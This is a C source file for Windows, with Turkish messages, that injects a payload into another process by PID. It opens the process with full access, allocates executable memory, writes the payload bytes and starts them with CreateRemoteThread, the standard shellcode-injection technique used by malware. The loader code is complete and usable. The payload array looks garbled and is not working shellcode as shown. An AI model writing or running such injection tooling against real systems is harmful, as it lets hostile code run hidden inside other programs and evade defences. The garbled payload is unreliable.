#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


unsigned char payload[] =
"x2e\x65\x78\x65\x00";

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Kullanim: %s <PID>\n", argv[0]);
        printf("Ornek: %s 1234\n", argv[0]);
        return 1;
    }
    
    DWORD pid = atoi(argv[1]);
    printf("[*] Hedef PID: %lu\n", pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[!] OpenProcess basarisiz. PID dogru mu? Admin yetkisi gerekli olabilir.\n");
        return 1;
    }
    printf("[+] Process handle alindi: %p\n", hProcess);

    LPVOID remoteAddr = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(payload), 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remoteAddr) {
        printf("[!] VirtualAllocEx basarisiz\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Bellek ayrildi: %p\n", remoteAddr);

    SIZE_T written;
    BOOL success = WriteProcessMemory(
        hProcess, 
        remoteAddr, 
        payload, 
        sizeof(payload), 
        &written
    );
    
    if (!success) {
        printf("[!] WriteProcessMemory basarisiz\n");
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Payload yazildi (%zu byte)\n", written);

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL
    );
    
    if (!hThread) {
        printf("[!] CreateRemoteThread basarisiz\n");
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Thread olusturuldu! Payload calisiyor...\n");

    WaitForSingleObject(hThread, INFINITE);
    printf("[*] Thread tamamlandi\n");
    
    VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    printf("[+] Islem tamamlandi\n");
    return 0;
}
